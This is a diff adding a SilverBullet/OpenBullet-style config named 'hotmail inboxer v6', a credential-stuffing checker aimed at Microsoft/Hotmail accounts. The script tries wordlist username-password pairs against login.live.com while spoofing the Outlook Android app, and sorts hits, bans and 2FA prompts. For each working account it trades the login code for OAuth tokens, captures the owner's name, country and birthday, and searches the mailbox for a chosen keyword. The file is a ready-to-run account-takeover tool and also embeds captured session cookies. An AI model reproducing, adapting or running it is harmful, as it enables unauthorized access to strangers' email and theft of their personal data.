@@ -1,0 +1,253 @@
+[SETTINGS]
+{
+  "Name": "hotmail inboxer v6 by pooh",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2025-11-07T18:10:59.5329818+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@Callmepooh",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "input keyword",
+      "VariableName": "kw",
+      "Id": 123116775
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "New_Fresh_Hotmail_Inbox",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": "",
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#@Callmepooh FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#@Callmepooh FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#@Callmepooh REQUEST POST "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216" 
+  CONTENT "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<US>&loginfmt=<US>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: MSPRequ=id=N&lt=1726223182&co=1; uaid=3d0f0eea617a4b9ca747100934dca583; RefreshTokenSso=Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$; MSPOK=$uuid-90478d00-dd39-405a-8731-bd22329637de; OParams=11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId; MicrosoftApplicationsTelemetryDeviceId=ac497201-f3d3-41a7-883c-c50515eabaca; ai_session=fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490; MUID=354ca661609b474d9471b6de17e93df7; fptctx2=taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCtEN7M2YMZXcDGxJBSYuGaBLu%252f9JiKDcHLb%252f8JINIhnqSktvc1WTHmZoNaDBGu0QNkIeXqEXSCok8RtGp9vucSE3bH5AyTgKraZz30bwBlRTs8zdebR61peqnbTMLSFu6Z%252fZI8YhEdhzrq6nSuKh7inDsCtL6VZeyS07TLSEhlzeZHY%252fjvAzMVzeXcFDOYLj9JQT%252fFVpLid%252bKgDYOoV40MX%252f0cn4aUVeWt%252bSo7YLMbJTg5NfzPcPtwlcy%252f8xu9HYDOWFtE6HZ%252b3j%252bSBwN5QxLYZkyNTTaCh7UxRHmNg2bu3qw%253d%253d; MSFPC=GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403" 
+  HEADER "Host: login.live.com" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "X-Requested-With: com.microsoft.office.outlook" 
+
+#@Callmepooh KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "Sign in to your Microsoft account" 
+  KEYCHAIN Ban OR 
+    KEY ",AC:null,urlFedConvertRename" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "ANON" 
+    KEY "<COOKIES>" Contains "WLSSC" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+    KEY "sSigninName" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "account.live.com/recover?mkt" 
+    KEY "recover?mkt" 
+    KEY "account.live.com/identity/confirm?mkt" 
+    KEY "/Abuse?mkt=" 
+
+#@Callmepooh PARSE "<ADDRESS>" LR "srf?code=" "&" -> VAR "CODE" 
+
+#@Callmepooh PARSE "<COOKIES(MSPCID)>" LR "" "" -> VAR "CI" 
+
+#@Callmepooh PARSE "<ADDRESS>" LR "client_info=" "&" -> VAR "RTK" 
+
+#@Callmepooh FUNCTION ToUppercase "<CI>" -> VAR "CID" 
+
+#@Callmepooh REQUEST POST "https://login.microsoftonline.com/consumers/oauth2/v2.0/token" 
+  CONTENT "client_info=1&client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&grant_type=authorization_code&code=<CODE>&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "client-request-id: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "correlation-id: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "return-client-request-id: false" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSAL 1.0)" 
+  HEADER "x-client-OS: 32" 
+  HEADER "x-client-SKU: MSAL.xplat.android" 
+  HEADER "x-client-src-SKU: MSAL.xplat.android" 
+  HEADER "x-client-Ver: 1.1.0+ad8a8025" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "refresh_token" -> VAR "ATK" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "access_token" -> VAR "MYTK" 
+
+#@Callmepooh REQUEST GET "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=9188040d-6c67-4c5b-b112-36a304b66dad" 
+  
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Enlightened-Hrd-Client: 1" 
+  HEADER "Host: odc.officeapps.live.com" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)" 
+  HEADER "X-CorrelationId: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+  HEADER "X-Office-Application: 145" 
+  HEADER "X-Office-Platform: Android" 
+  HEADER "X-Office-Platform-Version: 32" 
+  HEADER "X-Office-Version: 4.2424.2" 
+  HEADER "X-OneAuth-AppId: com.microsoft.office.outlook" 
+  HEADER "X-OneAuth-AppName: OutlookOneAuth" 
+  HEADER "X-OneAuth-Version: 2.5.0" 
+
+#@Callmepooh REQUEST POST "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token" 
+  CONTENT "client_info=1&client_id=0000000048170EF2&refresh_token=<ATK>&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default&grant_type=refresh_token" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "client-request-id: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "correlation-id: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "return-client-request-id: false" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSAL 1.0)" 
+  HEADER "x-client-OS: 32" 
+  HEADER "x-client-SKU: MSAL.xplat.android" 
+  HEADER "x-client-src-SKU: MSAL.xplat.android" 
+  HEADER "x-client-Ver: 1.1.0+ad8a8025" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "access_token" -> VAR "ATK2" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "id_token" -> VAR "jwt" 
+
+#@Callmepooh REQUEST GET "https://substrate.office.com/profileb2/v2.0/me/V1Profile" 
+  
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Authorization: Bearer <ATK2>" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "X-ClientRequestId: 3d0f0eea-617a-4b9c-a747-100934dca583" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "displayNameDefault" CreateEmpty=FALSE -> CAP "Name" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "location" CreateEmpty=FALSE -> CAP "Country" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "birthDay" -> VAR "1" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "birthMonth" -> VAR "2" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "birthYear" -> VAR "3" 
+
+#@Callmepooh FUNCTION Constant "<1> - <2> - <3>" -> CAP "birthday" 
+
+#@Callmepooh REQUEST POST "https://outlook.live.com/owa/<USER>/startupdata.ashx?app=Mini&n=0" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: outlook.live.com" 
+  HEADER "content-length: 0" 
+  HEADER "x-owa-sessionid: <COID>" 
+  HEADER "x-req-source: Mini" 
+  HEADER "authorization: Bearer <ATK2>" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36" 
+  HEADER "action: StartupData" 
+  HEADER "x-owa-correlationid: <COID>" 
+  HEADER "ms-cv: YizxQK73vePSyVZZXVeNr+.3" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://outlook.live.com" 
+  HEADER "x-requested-with: com.microsoft.office.outlook" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://outlook.live.com/" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#@Callmepooh PARSE "<SOURCE>" LR "DisplayName\":\"Inbox\",\"TotalCount\":" ",\"" CreateEmpty=FALSE -> CAP "total inbox in email" 
+
+#@Callmepooh KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Total inbox Message>" LessThan "1" 
+
+#@Callmepooh REQUEST POST "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124" 
+  CONTENT "{\"Cvid\":\"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Egypt Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\"<kw>\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"AnswerEntityRequests\":[{\"Query\":{\"QueryString\":\"<kw>\"},\"EntityTypes\":[\"Event\",\"File\"],\"From\":0,\"Size\":10,\"EnableAsyncResolution\":true}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"446c567a-02d9-b739-b9ca-616e0d45905c\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <ATK2>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "Total" -> VAR "total" 
+
+#@Callmepooh KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<total>" Contains "0" 
+  KEYCHAIN Success OR 
+    KEY "<Count>" GreaterThan "0" 
+
+#@Callmepooh PARSE "<SOURCE>" JSON "ConversationTopic" CreateEmpty=FALSE -> CAP "last msg" 
+
+#@Callmepooh FUNCTION Constant "<kw> = <total>" -> CAP "total" 
+
+#@Callmepooh FUNCTION Constant "pooh" -> CAP "config by" 
+
